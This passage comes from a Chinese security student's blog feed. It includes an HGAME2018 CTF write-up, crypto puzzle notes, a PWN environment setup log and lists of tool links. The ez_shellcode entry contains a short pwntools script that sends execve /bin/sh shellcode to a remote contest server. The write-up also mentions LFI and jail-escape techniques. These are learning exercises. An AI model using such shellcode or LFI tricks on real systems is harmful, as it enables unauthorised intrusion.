base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = open(<span class="string">"file"</span>,<span class="string">"wb"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.write(base64.b64decode(a))</span><br><span class="line"><span class="number">429</span></span><br></pre></td></tr></table></figure><p>然后去鉴定去</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># binwalk file</span></span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             gzip compressed data, from Unix, last modified: 2016-08-04 21:58:34</span><br></pre></td></tr></table></figure><p>接着解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># gzip -d file</span></span><br></pre></td></tr></table></figure><p>接着又是很明显的base64，解出来是个公钥</p><p>去分解一下，成功了</p><img src="/id0-rsa-WP合集/1525700559472.png" title="Recover the secret phone number"><p>求得私钥解出号码</p><h1 id="Optimal-Backpack-Allocation"><a href="#Optimal-Backpack-Allocation" class="headerlink" title="Optimal Backpack Allocation"></a>Optimal Backpack Allocation</h1><h1 id="Insecure-PRNG"><a href="#Insecure-PRNG" class="headerlink" title="Insecure PRNG"></a>Insecure PRNG</h1><h1 id="Playfair"><a href="#Playfair" class="headerlink" title="Playfair"></a>Playfair</h1><h1 id="CRIMEs-against-TLS"><a href="#CRIMEs-against-TLS" class="headerlink" title="CRIMEs against TLS"></a>CRIMEs against TLS</h1><h1 id="Bleichenbacher-39-s-CCA2-on-RSA"><a href="#Bleichenbacher-39-s-CCA2-on-RSA" class="headerlink" title="Bleichenbacher&#39;s CCA2 on RSA"></a>Bleichenbacher&#39;s CCA2 on RSA</h1><h1 id="Backdoored-PRNG"><a href="#Backdoored-PRNG" class="headerlink" title="Backdoored PRNG"></a>Backdoored PRNG</h1><h1 id="Not-So-Safe-Primes"><a href="#Not-So-Safe-Primes" class="headerlink" title="Not So Safe Primes"></a>Not So Safe Primes</h1><h1 id="DSA-with-LCG-nonces"><a href="#DSA-with-LCG-nonces" class="headerlink" title="DSA with LCG nonces"></a>DSA with LCG nonces</h1>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>安装式工具集合</title>
      <link href="/%E5%AE%89%E8%A3%85%E5%BC%8F%E5%B7%A5%E5%85%B7%E9%9B%86%E5%90%88/"/>
      <url>/%E5%AE%89%E8%A3%85%E5%BC%8F%E5%B7%A5%E5%85%B7%E9%9B%86%E5%90%88/</url>
      <content type="html"><![CDATA[<p>持续更新ing</p><p>可能以后还会重新整理</p><a id="more"></a><h1 id="英语工具"><a href="#英语工具" class="headerlink" title="英语工具"></a>英语工具</h1><p><a href="http://www.1checker.com/Products/DownLoad" target="_blank" rel="noopener">http://www.1checker.com/Products/DownLoad</a></p><p><a href="http://www.gingersoftware.com/zh/download" target="_blank" rel="noopener">http://www.gingersoftware.com/zh/download</a></p>]]></content>
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Software </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>逆向工程核心原理学习笔记（一）</title>
      <link href="/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      <content type="html"><![CDATA[]]></content>
      
      
    </entry>
    
    <entry>
      <title>HGAME2018-week2部分WP</title>
      <link href="/HGAME2018-week2%E9%83%A8%E5%88%86WP/"/>
      <url>/HGAME2018-week2%E9%83%A8%E5%88%86WP/</url>
      <content type="html"><![CDATA[<p>菜鸟每天飞过</p><a id="more"></a>，报告一下做题进度<br><br>-    Web<br>     - [x] Random?<br>     - [x] 草莓社区-1<br>     - [x] 草莓社区-2<br>     - [ ] XSS-1<br>     - [ ] XSS-2<br>     - [ ] 最简单的sql题<br>-    Rev<br>     - [ ] wtfitis<br>     - [ ] miaomiaowu<br>     - [ ] iccanobif<br>-    PWN<br>     - [x] ez_shellcode<br>     - [x] ez bash jail<br>     - [ ] hacker_system_ver1<br>     - [ ] ez_shellcode_ver2<br>-    Misc<br>     - [x] 咻咻咻<br>     - [x] White cosmos<br>     - [x] easy password<br>     - [x] mysterious file header<br>-    Crypto<br>     - [x] easy rsa<br>     - [x] the same simple RSA<br>     - [ ] xasr<br>     - [x] Caesar&amp;&amp;Caesar<br>     - [x] violence<br><br>所以我到底是啥呢？想了想，应该是Web瞎做，Bin乱搞，其他RP选手……<br><br># Web<br><br>## Random?<br><br>首先都提示了vim改代码，那就是源码泄露咯<br><br>试了一下是<img src="/HGAME2018-week2部分WP/snipaste20180213_175026.png" title="Random1"><p>用vim读一下<img src="/HGAME2018-week2部分WP/snipaste20180213_175201.png" title="Random2"></p><p>这里的方法是构造一个对象使public和secret公用空间，方法是<img src="/HGAME2018-week2部分WP/snipaste20180213_180251.png" title="Random3"></p><img src="/HGAME2018-week2部分WP/snipaste20180213_180245.png" title="Random4"><h2 id="草莓社区-1"><a href="#草莓社区-1" class="headerlink" title="草莓社区-1"></a>草莓社区-1</h2><p>LFI嘛，最简单的肯定是直接来咯</p><img src="/HGAME2018-week2部分WP/snipaste20180213_171633.png" title="草莓社区-1"><h2 id="草莓社区-2"><a href="#草莓社区-2" class="headerlink" title="草莓社区-2"></a>草莓社区-2</h2><p>难一点的就用base64编码读咯</p><img src="/HGAME2018-week2部分WP/snipaste20180213_172618.png" title="草莓社区-2_1"><img src="/HGAME2018-week2部分WP/snipaste20180213_172626.png" title="草莓社区-2_2"><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="ez-shellcode"><a href="#ez-shellcode" class="headerlink" title="ez_shellcode"></a>ez_shellcode</h2><p>既然是直接执行，那找一个就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"111.230.149.72"</span>,<span class="number">10004</span>)</span><br><span class="line"><span class="keyword">print</span> r.recv</span><br><span class="line">payload = <span class="string">"\x6a\x0b"</span>+<span class="string">"\x58"</span>+<span class="string">"\x99"</span>+<span class="string">"\x52"</span>+<span class="string">"\x68\x2f\x2f\x73\x68"</span>+<span class="string">"\x68\x2f\x62\x69\x6e"</span>+<span class="string">"\x89\xe3"</span>+<span class="string">"\x52"</span> +<span class="string">"\x53"</span>+<span class="string">"\x89\xe1"</span>+<span class="string">"\xcd\x80"</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="ez-bash-jail"><a href="#ez-bash-jail" class="headerlink" title="ez bash jail"></a>ez bash jail</h2><p>根据视频教程</p><img src="/HGAME2018-week2部分WP/snipaste20180214_171547.png" title="ez bash jail"><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="咻咻咻"><a href="#咻咻咻" class="headerlink" title="咻咻咻"></a>咻咻咻</h2><p>首先是一个zip伪加密<img src="/HGAME2018-week2部分WP/snipaste20180211_211448.png" title="咻咻咻1"></p><p>解压出来以后按照<a href="https://ethackal.github.io/2015/10/05/derbycon-ctf-wav-steganography/用Ruby来解码" target="_blank" rel="noopener">https://ethackal.github.io/2015/10/05/derbycon-ctf-wav-steganography/用Ruby来解码</a></p><img src="/HGAME2018-week2部分WP/snipaste20180212_203651.png" title="咻咻咻2"><p>明显是Base64，解码得flag</p><h2 id="White-cosmos"><a href="#White-cosmos" class="headerlink" title="White cosmos"></a>White cosmos</h2><p>PWNHUB密码学专场里的签到题的套路</p><p>打开一看0x09/0x20心里就有底了<img src="/HGAME2018-week2部分WP/snipaste20180211_204814.png" title="white cosmos1"></p><p>因为可见字符首位应该是0，所以0x09对应0，0x20对应1</p><img src="/HGAME2018-week2部分WP/snipaste20180211_205356.png" title="white cosmos2"><h2 id="easy-password"><a href="#easy-password" class="headerlink" title="easy password"></a>easy password</h2><p>没什么好说的，跑就是了</p><img src="/HGAME2018-week2部分WP/snipaste20180211_210003.png" title="easy password"><h2 id="mysterious-file-header"><a href="#mysterious-file-header" class="headerlink" title="mysterious file header"></a>mysterious file header</h2><p>首先是zip包把前四字节做了一下调整，还是比较明显的，改正常以后解压就行</p><img src="/HGAME2018-week2部分WP/snipaste20180211_222543.png" title="mysterious file header1"><p>解压出来的文件拿反编译器<a href="http://www.javadecompilers.com/搞一下" target="_blank" rel="noopener">http://www.javadecompilers.com/搞一下</a></p><p>有用的代码为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Decompiled with CFR 0_123.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">package</span> GUI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.Component;</span><br><span class="line"><span class="keyword">import</span> java.awt.GridLayout;</span><br><span class="line"><span class="keyword">import</span> java.awt.LayoutManager;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionEvent;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionListener;</span><br><span class="line"><span class="keyword">import</span> javax.swing.JButton;</span><br><span class="line"><span class="keyword">import</span> javax.swing.JFrame;</span><br><span class="line"><span class="keyword">import</span> javax.swing.JPanel;</span><br><span class="line"><span class="keyword">import</span> javax.swing.JTextArea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">hgameGUI</span></span></span><br><span class="line"><span class="class">        <span class="keyword">extends</span> <span class="title">JFrame</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DEFAULT_WIDTH = <span class="number">300</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DEFAULT_HEIGHT = <span class="number">200</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">hgameGUI</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(<span class="string">"Welcome to Hgame!"</span>);</span><br><span class="line">        <span class="keyword">this</span>.setSize(<span class="number">300</span>, <span class="number">200</span>);</span><br><span class="line">        JButton flag1 = <span class="keyword">new</span> JButton(<span class="string">"i'm flag"</span>);</span><br><span class="line">        JButton flag2 = <span class="keyword">new</span> JButton(<span class="string">"i'm flag, too."</span>);</span><br><span class="line">        JButton flag3 = <span class="keyword">new</span> JButton(<span class="string">"RU kidding me? I'm the true flag!"</span>);</span><br><span class="line">        JButton flag4 = <span class="keyword">new</span> JButton(<span class="string">"UR wrong, I'm the true flag!"</span>);</span><br><span class="line">        JTextArea flagtext = <span class="keyword">new</span> JTextArea(<span class="string">"Want flag? Try upstairs."</span>);</span><br><span class="line">        JPanel flag = <span class="keyword">new</span> JPanel();</span><br><span class="line">        flag.setLayout(<span class="keyword">new</span> GridLayout(<span class="number">5</span>, <span class="number">1</span>));</span><br><span class="line">        flag.add(flag1);</span><br><span class="line">        flag.add(flag2);</span><br><span class="line">        flag.add(flag3);</span><br><span class="line">        flag.add(flag4);</span><br><span class="line">        flag.add(flagtext);</span><br><span class="line">        flag1.addActionListener(event -&gt; &#123;</span><br><span class="line">                    flagtext.setText(<span class="string">"118"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line">        flag2.addActionListener(event -&gt; &#123;</span><br><span class="line">                    flagtext.setText(<span class="string">"54"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line">        flag3.addActionListener(event -&gt; &#123;</span><br><span class="line">                    flagtext.setText(<span class="string">"29"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line">        flag4.addActionListener(event -&gt; &#123;</span><br><span class="line">                    flagtext.setText(<span class="string">"89"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">this</span>.add(flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>智障的我反应了半天才明白这是IP地址</p><p>遍历一下顺序查一下，在中国的一个IP里找到</p><img src="/HGAME2018-week2部分WP/snipaste20180212_211411.png" title="mysterious file header2"><img src="/HGAME2018-week2部分WP/snipaste20180212_211452.png" title="mysterious file header3"><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="easy-rsa"><a href="#easy-rsa" class="headerlink" title="easy rsa"></a>easy rsa</h2><p>明明还是偶尔摸摸ACM的，二分都想不起来……MDZZ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="number">10385112853503545283534594498014002163302819192542881359629016178651814593394538223939733674125477453748418677846543570433509186453439897628509042367641638605796280506469598857872127102183624493512082415420093824666579257184064851925863532407038708153173813845163607930388067232852387553655027755138043051251085946275767001373277444643651026212284925970808939348126454571156523402419571304104957238600724334148041629955456548891850609245486162713434748801968838458008730625275388077430783612116161245037630984479400721315318755404657093206825883572149393481806067157147431981573823960963614146686202457034323040706001</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">4371976065894333890314975885075127128451240983808800709698046359245834252220415066013588488225793488033803390795656718853587692177687489853479502247266771924035749805299269602527272036788769904108885493823764984982805025952459173246366939243972669582338728034363614943062106220697944193226897767645789368465460202024200438535770983989035642434091720020123447189714932941203953201421143816856602410516207702904806903435163191348277867475813985765685033173827201970396908439360218409562692753257235084893548449865848486681931258855329384534422245333790248671083002562017871712806386748477524316776702973435067495735891</span></span><br><span class="line">h = <span class="number">211473031829143387075248424832701297198713292770838284307849674781204968609248808096119074157099909881957829793545784295167214864644080464847006389628006758327477845870101535232054809595189429534377867001767649036319119343001102771623484473596258682675319189568166030200094562890253995876322745344347924616750</span></span><br><span class="line"></span><br><span class="line">low = <span class="number">1</span></span><br><span class="line">high = h//<span class="number">2</span> </span><br><span class="line">mid =int((low+high))//<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> low&lt;high:</span><br><span class="line"><span class="keyword">if</span> low*(h-low)  &gt; N:</span><br><span class="line">high = mid<span class="number">-1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">low = mid + <span class="number">1</span></span><br><span class="line">mid = (low+high)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">print(low)</span><br><span class="line">print(h-low)</span><br></pre></td></tr></table></figure><p>这样就有p/q了</p><p>后来发现这出题人一开始应该没这样想</p><p>回头补……</p><h2 id="The-same-simple-RSA"><a href="#The-same-simple-RSA" class="headerlink" title="The same simple RSA"></a>The same simple RSA</h2><p>先读一下key咯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ openssl rsa -pubin -<span class="keyword">in</span> pubkey.pem -text -modulus</span><br><span class="line">Public-Key: (256 bit)</span><br><span class="line">Modulus:</span><br><span class="line">    00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:</span><br><span class="line">    1a:ac:6c:0b:f6:<span class="built_in">cd</span>:3d:70:eb:ca:28:1b:ff:e9:7f:</span><br><span class="line">    be:30:dd</span><br><span class="line">Exponent: 65537 (0x10001)</span><br><span class="line">Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr</span><br><span class="line">yigb/+l/vjDdAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">writing RSA key</span><br></pre></td></tr></table></figure><p>256位嘛，好说了</p><img src="/HGAME2018-week2部分WP/snipaste20180212_150022.png" title="The same simple RSA"><p>然后用rsatool生成pem文件，解密得flag</p><p>需要注意的是有了q/p也不能直接解密，这是使用了openssl的缘故（具体的我还没了解过</p><h2 id="Caesar-amp-amp-Caesar"><a href="#Caesar-amp-amp-Caesar" class="headerlink" title="Caesar&amp;&amp;Caesar"></a>Caesar&amp;&amp;Caesar</h2><p>直接在线解咯</p><p>要分析的话，就是指数重叠+频率分析？</p><h2 id="violence"><a href="#violence" class="headerlink" title="violence"></a>violence</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">"191709050607090519_0706_0603150519_03_0a0706_170c_1407170205101105"</span></span><br><span class="line">a = a.replace(<span class="string">'_'</span>,<span class="string">''</span>)</span><br><span class="line">str = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,int(len(a)/<span class="number">2</span>)):</span><br><span class="line">str+=chr(ord(<span class="string">'a'</span>)+int(a[<span class="number">2</span>*i]+a[<span class="number">2</span>*i+<span class="number">1</span>],<span class="number">16</span>))</span><br><span class="line">print(str)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pycipher <span class="keyword">import</span> Affine</span><br><span class="line"></span><br><span class="line">s = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">21</span>,<span class="number">23</span>,<span class="number">25</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">25</span>):</span><br><span class="line">print(Affine(a=i,b=j).encipher(<span class="string">'zxjfghjfzhggdvfzdkhgxmuhxcfqrf'</span>).lower())</span><br></pre></td></tr></table></figure><p>然后找到</p><img src="/HGAME2018-week2部分WP/snipaste20180211_220623.png" title="violence">]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> Misc </tag>
            
            <tag> PWN </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PWN学习记录</title>
      <link href="/PWN%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>/PWN%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      <content type="html"><![CDATA[<p>学习PWN的记录</p><p>可能会有路线，看填坑进度……</p><a id="more"></a><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>按理说第一篇是要说一下这个</p><p>我是Kali 2.0，所以就按照如下指令输进去就行了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dpkg --add-architecture i386 </span><br><span class="line">apt-get update</span><br><span class="line">apt-get -f dist-upgrade </span><br><span class="line">apt-get install lib32c-dev lib32stdc++6 libc6:i386 gcc-multilib</span><br><span class="line">apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">pip install pwntools</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg /opt/pwndbg</span><br><span class="line"><span class="built_in">cd</span> /opt/pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><h1 id="学习记录及WP地址"><a href="#学习记录及WP地址" class="headerlink" title="学习记录及WP地址"></a>学习记录及WP地址</h1><ul><li><p>Exploit-Exercise</p><ul><li style="list-style: none"><input type="checkbox"> Nebula</li><li style="list-style: none"><input type="checkbox" checked> <a href="http://csuwangj.top/2018/07/22/Exploit-Exercise-Protostar%E5%85%A8%E6%94%BB%E7%95%A5-%E8%A7%A3%E6%9E%90/" target="_blank" rel="noopener">Protostar</a>（解析还没写XD）</li><li style="list-style: none"><input type="checkbox"> <a href="https://csuwangj.github.io/2018/08/03/Exploit-Exercise-Fusion%E5%85%A8%E6%94%BB%E7%95%A5-%E8%A7%A3%E6%9E%90/">Fusion</a></li><li>Main Sequence<ul><li style="list-style: none"><input type="checkbox"> Main Sequence</li><li style="list-style: none"><input type="checkbox"> Story line</li><li style="list-style: none"><input type="checkbox"> Setup instructions</li><li style="list-style: none"><input type="checkbox"> Irate Manticore</li><li style="list-style: none"><input type="checkbox"> Touchy Owl</li><li style="list-style: none"><input type="checkbox"> Wild Amphibian</li><li style="list-style: none"><input type="checkbox"> Storming Bear</li><li style="list-style: none"><input type="checkbox"> Screaming Jesus</li><li style="list-style: none"><input type="checkbox"> Fabled Scorpion</li><li style="list-style: none"><input type="checkbox"> Selfish Dragonfly</li><li style="list-style: none"><input type="checkbox"> Vicious Platypus</li></ul></li></ul></li><li>CTF<ul><li>HGAME2018<ul><li><a href="http://csuwangj.github.io/2018/02/08/HGAME2018-week1WP/">week1</a><ul><li style="list-style: none"><input type="checkbox" checked> guess_number</li><li style="list-style: none"><input type="checkbox" checked> flag_server</li><li style="list-style: none"><input type="checkbox" checked> zazahui</li></ul></li><li><a href="http://csuwangj.top/2018/02/16/HGAME2018-week2%E9%83%A8%E5%88%86WP/" target="_blank" rel="noopener">week2</a><ul><li style="list-style: none"><input type="checkbox" checked> ez_shellcode</li><li style="list-style: none"><input type="checkbox" checked> ez bash jail</li><li style="list-style: none"><input type="checkbox"> hacker_system_ver1</li><li style="list-style: none"><input type="checkbox"> ez_shellcode_ver2</li></ul></li></ul></li></ul></li><li>To be continue...</li></ul>]]></content>
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>轻工具个人集合</title>
      <link href="/%E8%BD%BB%E5%B7%A5%E5%85%B7%E4%B8%AA%E4%BA%BA%E9%9B%86%E5%90%88/"/>
      <url>/%E8%BD%BB%E5%B7%A5%E5%85%B7%E4%B8%AA%E4%BA%BA%E9%9B%86%E5%90%88/</url>
      <content type="html"><![CDATA[<p>持续更新ing</p><p>可能以后还会重新整理</p><a id="more"></a><h1 id="cpp在线沙盒编译器"><a href="#cpp在线沙盒编译器" class="headerlink" title="cpp在线沙盒编译器"></a>cpp在线沙盒编译器</h1><p><a href="https://wandbox.org/" target="_blank" rel="noopener">https://wandbox.org/</a></p><h1 id="cpp生成汇编代码"><a href="#cpp生成汇编代码" class="headerlink" title="cpp生成汇编代码"></a>cpp生成汇编代码</h1><p><a href="https://godbolt.org/" target="_blank" rel="noopener">https://godbolt.org/</a></p><h1 id="Web在线写项目"><a href="#Web在线写项目" class="headerlink" title="Web在线写项目"></a>Web在线写项目</h1><p><a href="https://stackblitz.com/" target="_blank" rel="noopener">https://stackblitz.com/</a></p><h1 id="数据结构-算法可视化"><a href="#数据结构-算法可视化" class="headerlink" title="数据结构/算法可视化"></a>数据结构/算法可视化</h1><p><a href="https://visualgo.net/zh" target="_blank" rel="noopener">https://visualgo.net/zh</a></p><p><a href="http://algo-visualizer.jasonpark.me/#path=backtracking/n_queens/n_queens" target="_blank" rel="noopener">http://algo-visualizer.jasonpark.me/#path=backtracking/n_queens/n_queens</a></p><p><a href="http://www.cs.usfca.edu/~galles/visualization/Algorithms.html" target="_blank" rel="noopener">http://www.cs.usfca.edu/~galles/visualization/Algorithms.html</a></p><h1 id="一个工具集"><a href="#一个工具集" class="headerlink" title="一个工具集"></a>一个工具集</h1><p><a href="http://tool.yovisun.com/" target="_blank" rel="noopener">http://tool.yovisun.com/</a></p><p><a href="http://tool.yovisun.com/journal/" target="_blank" rel="noopener">学术期刊影响因子及分类分区目录</a></p><p><a href="http://tool.yovisun.com/journal/index.php" target="_blank" rel="noopener">2014年分区表</a>　<a href="http://tool.yovisun.com/journal/hust2012.php" target="_blank" rel="noopener">2012年分区表</a>　<a href="http://tool.yovisun.com/journal/hust2011.php" target="_blank" rel="noopener">2011年分类目录</a>　<a href="http://tool.yovisun.com/journal/hust2012mse.php" target="_blank" rel="noopener">材料学院2012年国际一流期刊</a></p><p><a href="http://tool.yovisun.com/scihub/" target="_blank" rel="noopener">SCI-Hub可用网址链接</a></p><p><a href="http://tool.yovisun.com/kuaidi/" target="_blank" rel="noopener">智能快递查询</a></p><p><a href="http://tool.yovisun.com/grabvideo/" target="_blank" rel="noopener">在线视频智能解析下载</a></p><p><a href="http://tool.yovisun.com/unit/" target="_blank" rel="noopener">计量单位换算器</a></p><p><a href="http://tool.yovisun.com/unit/length.php" target="_blank" rel="noopener">长度计量单位换算器</a>　<a href="http://tool.yovisun.com/unit/weight.php" target="_blank" rel="noopener">重量计量单位换算器</a></p><p><a href="http://tool.yovisun.com/wordcounter/" target="_blank" rel="noopener">WordCounter 英文论文单词统计</a></p><p><a href="http://tool.yovisun.com/htmljs/" target="_blank" rel="noopener">HTML/JavaScript格式化及加密压缩工具</a></p><p><a href="https://www.bejson.com/" target="_blank" rel="noopener">BBeJSON 工具</a></p><p><a href="http://tool.yovisun.com/alphabet/" target="_blank" rel="noopener">英文单词大小写转换</a></p><p><a href="http://tool.yovisun.com/rgbcolor/" target="_blank" rel="noopener">RGB颜色在线拾取与转换</a></p><p><a href="http://tool.yovisun.com/json/" target="_blank" rel="noopener">JSON代码格式化及着色工具</a></p><p><a href="http://tool.yovisun.com/rmb/" target="_blank" rel="noopener">数字转换成大写金额</a></p><p><a href="http://tool.yovisun.com/tianqi/" target="_blank" rel="noopener">未来一小时天气精准查询</a></p><p><a href="http://tool.yovisun.com/longlat/" target="_blank" rel="noopener">经纬度查询两点距离</a></p><h1 id="在线分解质因子"><a href="#在线分解质因子" class="headerlink" title="在线分解质因子"></a>在线分解质因子</h1><p><a href="http://factordb.com" target="_blank" rel="noopener">http://factordb.com</a></p><h1 id="OEIS数列查找"><a href="#OEIS数列查找" class="headerlink" title="OEIS数列查找"></a>OEIS数列查找</h1><p><a href="http://oeis.org/" target="_blank" rel="noopener">http://oeis.org/</a></p><h1 id="时光机器"><a href="#时光机器" class="headerlink" title="时光机器"></a>时光机器</h1><p><a href="https://web.archive.org/" target="_blank" rel="noopener">https://web.archive.org/</a></p><h1 id="书籍、论文下载"><a href="#书籍、论文下载" class="headerlink" title="书籍、论文下载"></a>书籍、论文下载</h1><p><a href="http://gen.lib.rus.ec/" target="_blank" rel="noopener">http://gen.lib.rus.ec/</a></p><p><a href="https://libgen.pw/" target="_blank" rel="noopener">https://libgen.pw/</a></p><p><a href="http://readfree.me/" target="_blank" 